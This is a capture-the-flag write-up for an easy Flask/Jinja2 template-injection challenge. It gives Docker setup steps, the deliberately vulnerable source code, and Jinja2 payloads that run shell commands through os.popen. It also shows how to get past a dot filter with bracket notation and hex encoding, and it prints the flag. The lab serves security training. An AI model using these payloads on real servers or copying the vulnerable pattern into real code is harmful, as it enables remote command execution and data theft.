# SSTI-Easy 1

### Difficulty: Easy

### Objective: Bypass blacklisted (".")

## Setting Up

Ensures that `Docker` is installed into your machine as this challenge requires Docker. If you're unsure how to do it, you can refer [here](https://www.kali.org/docs/containers/installing-docker-on-kali/) to install it into your Kali machine.

### Commands (Kali)
[1] `sudo docker build -t sstichall .`

[2] `sudo docker run -d sstichall`

[3] `sudo docker logs <The container id>`

Use the first IP provided by the command [3] to access the challenge as highlighted below.

![image](https://github.com/user-attachments/assets/a2dc8099-2cb9-42d9-a8d2-c34d04b245e8)

Challenge should look like this and you are ready to go!

![image](https://github.com/user-attachments/assets/71d4d057-c35f-4c21-b28f-efaa2f35bff9)

## Solution 
<details>

The challenge starts with a text box and allows user input. Then, we starts with the a simple text "hello world" and observe its response.

![image](https://github.com/user-attachments/assets/8c6da092-9fc2-4a3b-9054-d900ca44c47d)

The website seems to return our text back as a response. 

![image](https://github.com/user-attachments/assets/03732c9a-86e7-4042-9ea6-9877e978db85)

Let's try using a simple SSTI payload `{{7*7}}` and observe its behaviour.

![image](https://github.com/user-attachments/assets/d853ed2f-3c60-48bd-880a-be6fa23756ca)

The website returns `49`! That means it is vulnerable to SSTI.

![image](https://github.com/user-attachments/assets/26b6ae54-1bfe-4884-9df2-66fe944dbcea)

Let's use a SSTI payload like `{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}` and get our flag!

![image](https://github.com/user-attachments/assets/579ab938-dac5-4d4a-8aed-3edd8ad37819)

Wait but the website prevented us from using the payload.

![image](https://github.com/user-attachments/assets/01fb2f5e-312b-48a1-b6b6-ffc1ceec65d7)

That's weird, it supposed to work. Let's inspect and analyze the provided source code.

### Source Code (python)
```python

from flask import Flask, request, url_for, render_template_string
import re

app=Flask(__name__)

@app.route('/', methods=('GET','POST'))
def index():
	if request.method=='POST':
		note=request.form['note']
		if sanitize(note):
			return render_template_string(note)
		else:
			return('Please provide some text')
	return '''
		<form method="POST">
			Note:<input type="text" name="note">
			<input type="submit" value="Submit">
		</form>
	'''

def sanitize(x):
	if "." in x:
		return False
	return True

if __name__=='__main__':
	app.run(host='0.0.0.0',port= 5000,debug=True)

```

The website is confirmed to be vulnerable to SSTI (Jinja 2) as the source code contains the function `render_template_string`. However, there is a function that seems to be preventing us from reaching the vulnerable function which is the `sanitize()`. It will return boolean `False` when it detected the strings contains "." which can prevent a regular SSTI payload. We can use another SSTI payload to bypass this sanitization by replacing "." with square brackets.

`{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}`

![image](https://github.com/user-attachments/assets/531cce88-b3fe-46fb-8f07-1e2c3d123338)

Let's submit this payload and see what happens.

![image](https://github.com/user-attachments/assets/d3cbfda0-eee2-4e8c-bc99-04ec01dc5b8c)

And it works! We can view all the files contain inside the server directory. Let's try to view the flag using command:

`{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag-923a4ee403778170c879557425f22848.txt')['read']()}}`

![image](https://github.com/user-attachments/assets/c43644b2-a538-469d-89e3-7b2290c0d623)

Wait but the website still denying us? But why? It seems like the filename `flag-923a4ee403778170c879557425f22848.txt` has a "." in the extension which preventing us from performing the exploit.
Luckily, we can bypass this by simply encoding the filename into hex like this:

`\x66\x6c\x61\x67\x2d\x39\x32\x33\x61\x34\x65\x65\x34\x30\x33\x37\x37\x38\x31\x37\x30\x63\x38\x37\x39\x35\x35\x37\x34\x32\x35\x66\x32\x32\x38\x34\x38\x2e\x74\x78\x74`

Let's use it on our previous payload and it should be able to bypass the sanitization.

```{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat \x66\x6c\x61\x67\x2d\x39\x32\x33\x61\x34\x65\x65\x34\x30\x33\x37\x37\x38\x31\x37\x30\x63\x38\x37\x39\x35\x35\x37\x34\x32\x35\x66\x32\x32\x38\x34\x38\x2e\x74\x78\x74')['read']()}}```

At last, we finally able to obtain the flag!

![image](https://github.com/user-attachments/assets/7ccbea20-685f-40e4-b6a5-920619b8c222)

## Flag
>flag{c2ea5e9e00acde74027b2ad8cf5583bd}

</details>
